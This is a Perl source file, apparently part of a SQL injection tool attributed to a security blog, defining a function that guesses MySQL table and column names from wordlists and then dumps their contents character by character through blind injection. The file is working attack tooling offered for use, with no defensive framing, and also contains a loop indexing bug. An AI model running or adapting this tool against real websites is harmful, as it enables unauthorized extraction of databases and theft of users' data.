#!/usr/local/bin/perl

#-----------------------------------------------------------------------------------------#
# Injection tool by VOİXSEC.BLOGSPOT.COM
# Code version: 2.0
# Function file: Get about by web, Get tables&columns, Dump data (Blind injection)
#-----------------------------------------------------------------------------------------#

require "MySQL/blind_tool.pl";  

sub blind_MySQL()
{
	$concat = "";
	$tableN = "";
	$prefix = $_[0];
	@columns_found = ();
	$sub = 1;
		
	for($i = 0; $i < @tables; $i++)
	{	
		$tables[$i] =~ s/[\r\n\s]/ /g;	
		$tables[$i] =~ s/\s+$//; 
		
		&generalPrint($serverA."\n\nFind table name: ". $tables[$i],1);
		
		if($prefix eq "") 
		{
			if(&blind_MySQL_foundTable($tables[$i]))
			{
				$tableN = $tables[$i];		
				$i = @tables;
			}
		}
		else
		{
			@names = ($tables[$i], $tables[$i]."_".$prefix, $prefix."_".$tables[$i]); 
			
			for($j = 0; $j < @names; $j++) 
			{				
				if(&blind_MySQL_foundTable($names[$i]))
				{
					$tableN = $names[$i];					
					$j = @names;
					$i = @tables;
					
				}
			}
		}
	}
		
	if($tableN eq "")
	{
		&generalPrint($serverA."\nSorry, cannot find the table name :[",1);
		exit;
	}
	&generalPrint($serverA."\n\nTable name  : ". $tableN."\nFind columns name : ",1);

	for($i=0; $i<@column; $i++)
	{
		$column[$i] =~ s/[\r\n\s]/ /g;	
		$column[$i] =~ s/\s+$//; 
		
		&generalPrint($serverA."\n\nTable name   : ". $tableN."\n\nFind columns name : ". $column[$i].$printer,1);
		
		if(&blind_MySQL_foundColumn($tableN, $column[$i]))
		{
			$columns_found[@columns_found] = $column[$i]; 
			$dumps[@dumps] = $column[$i]; 
			
			if(@columns_found == 1)
			{
				$printer = "\nColumns found: ".$column[$i];
			}
			else
			{
				$printer .= ", ".$columns_found[@columns_found-1];
			}
		}
	}
	
	if(@columns_found <= 0)
	{
		&generalPrint($serverA."\nSorry, cannot find columns :[",1);
		exit;
	}
	
	&generalPrint($serverA."\n\nTable name   : ". $tableN.$printer,1);
	
	for($i=0; $i<@columns_found; $i++) 
	{ 	                
	    if($i != (@columns_found-1)){$concat .= $columns_found[$i].",0x3b,";} 
	    else{$concat .= $columns_found[$i];} 
	} 
	
	&generalPrint($serverA."\n\nTable name   : ". $tableN.$printer,1);
	print "Limit: ";
	chomp($limit = <STDIN>);
	
	$s_concat = $concat;
	$s_concat =~ s/\,0x3a\,/,/g;
	
	$printer = $serverA."\n\nTable name   : ". $tableN.$printer."\nLimit: ".$limit.
			   "\n\nResult(".$s_concat."):\n\n";
		
	&generalPrint($printer,1);
	
	if($_[1] == 1)
	{
		$dump_num    = $limit;
		$dump_concat = $concat;
		$table_injection = $tableN;
		
		$printer .= &regular_MySQL_dumpData();
		&generalPrint($printer,1);
	}
	else
	{	
		$char   = &blind_MySQL_char($concat,$tableN,$limit,$sub);
		$chars .= chr($char);
		&generalPrint($printer.$chars,1);
	
		while($char != 0)
		{
			$sub++;
			$char   = &blind_MySQL_char($concat,$tableN,$limit,$sub);
			$chars .= chr($char);
			&generalPrint($printer.$chars,1);
		}
	}	
}

1;
